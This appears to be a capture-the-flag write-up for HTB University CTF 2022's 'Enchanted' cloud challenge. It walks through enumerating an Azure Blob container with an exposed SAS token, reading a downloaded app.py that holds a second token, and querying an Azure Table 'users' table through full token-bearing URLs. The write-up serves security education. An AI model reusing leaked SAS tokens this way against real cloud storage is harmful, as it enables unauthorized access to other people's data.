# :game_die: HTB University CTF 2022 — Cloud — Enchanted

---

# HTB University CTF 2022 — Cloud — Enchanted

Hack The Box University CTF is a great CTF for university and college students all around the world. The challenges represent a real world scenario helping you improve your cybersecurity knowledge. This writeup focuses on Azure Cloud enumeration & exploitation.

## Scanning for open ports

Scanning the IP address provided in the challenge using nmap. We find out there are 5 ports opened in total. Let’s enumerate the web service running on port 80.

## Enumerating web services

Analyzing the client source, we can say that the application is fetching certain resouces from Azure Blob.

The Azure Blob can be accessed at [http://enchanted.blob.core.windows.net:10000](http://enchanted.blob.core.windows.net:10000). Let’s open up /etc/hosts file and add enchanted.blob.core.windows.net in it.

## Azure Blob Exploitation

It is possible to enumerate the Azure blob via web. As you can see in the screenshot given in the above section, we can look at some parameters like se, sp, sv, sr and sig. These parameters combine together to form a sas_token which is a secure way to grant limited access to the resources without compromising the account keys.

This way we can try to access or enumerate some other resources in the Azure Blob using this sas_token either via Web or SDK.

### Enumerating resources

Here, the container name is enchanted and we have access to the sas_token. To list the container entries, we can visit the following URL given below,

```
http://enchanted.blob.core.windows.net:10000/enchanted?restype=container&comp=list&se=2420-01-01&sp=rl&sv=2021-06-08&sr=c&sig=pkZBtmnBrAd5UtKzsLNKq1XOUTOwpUcB2A%2B2jUa9UzI%3D
```

The app.py file looks interesting. We can access the contents of that by visiting the URL given below,

```
http://enchanted.blob.core.windows.net:10000/enchanted/dev/app.py?se=2420-01-01&sp=rl&sv=2021-06-08&sr=c&sig=pkZBtmnBrAd5UtKzsLNKq1XOUTOwpUcB2A%2B2jUa9UzI%3D
```

Upon visiting the URL, the app.py file should get downloaded in your local machine.

```
from flask import *

dev = Flask(__name__)

@dev.route('/')
def index():
return render_template('index.html')

@dev.route('/fetch')
def fetch():
table_service = TableService(sas_token='se=2420-01-01&sp=raud&sv=2019-02-02&tn=users&sig=m9BmFvpbJBTug8psvW6RJo/FNLmReeLl8%2B4kH5bimCw%3D', protocol='http', endpoint_suffix='core.windows.net')
i=0
next_pk = None
next_rk = None
while True:
entities=table_service.query_entities('users',"PartitionKey eq 'Username'", next_partition_key = next_pk, next_row_key = next_rk, top=1000)
i+=1
for entity in entities:
return render_template('home.html',entities=entity.AddressLine1)
if hasattr(entities, 'x_ms_continuation'):
x_ms_continuation = getattr(entities, 'x_ms_continuation')
next_pk = x_ms_continuation['nextpartitionkey']
next_rk = x_ms_continuation['nextrowkey']
else:
break
```

The file contains some information about the TableService and the sas_token associated with it. Azure Table storage is a service that stores non-relational structured data (also known as structured NoSQL data) in the cloud.

## Azure Table Exploitation

Azure Table storage is a service that stores non-relational structured data (also known as structured NoSQL data) in the cloud, providing a key/attribute store with a schemaless design.

## Get Akshay Shinde’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The table service runs on port *10002*and we have extracted the sas_token from the source code (Downloaded earlier). Using the information gathered so far, we can enumerate the Azure Table Storage either via Web or SDK.

Reference: [https://learn.microsoft.com/en-us/rest/api/storageservices/query-entities](https://learn.microsoft.com/en-us/rest/api/storageservices/query-entities)

Also one more thing, we need to add enchanted.table.core.windows.net in the /etc/hosts file to access the Table Service.

### Enumerating users table

To list all the entries from the users table, we can access the URL given below,

```
http://enchanted.blob.core.windows.net:10002/users?se=2420-01-01&sp=raud&sv=2019-02-02&tn=users&sig=m9BmFvpbJBTug8psvW6RJo/FNLmReeLl8%2B4kH5bimCw%3D
```

We got the sas_token from the source code downloaded earlier. Upon accessing the URL, we should get some error like AtomFormatNotSupported.

This error can be fixed by replacing the Accept header with a value of “application/json;odata=nometadata”

Reference: [https://stackoverflow.com/questions/39463917/azure-table-service-rest-api-json-format-is-not-supported](https://stackoverflow.com/questions/39463917/azure-table-service-rest-api-json-format-is-not-supported)

Thank you for taking your time to read my writeup :)

### From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. [Join our weekly newsletter](https://weekly.infosecwriteups.com/) to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!

---
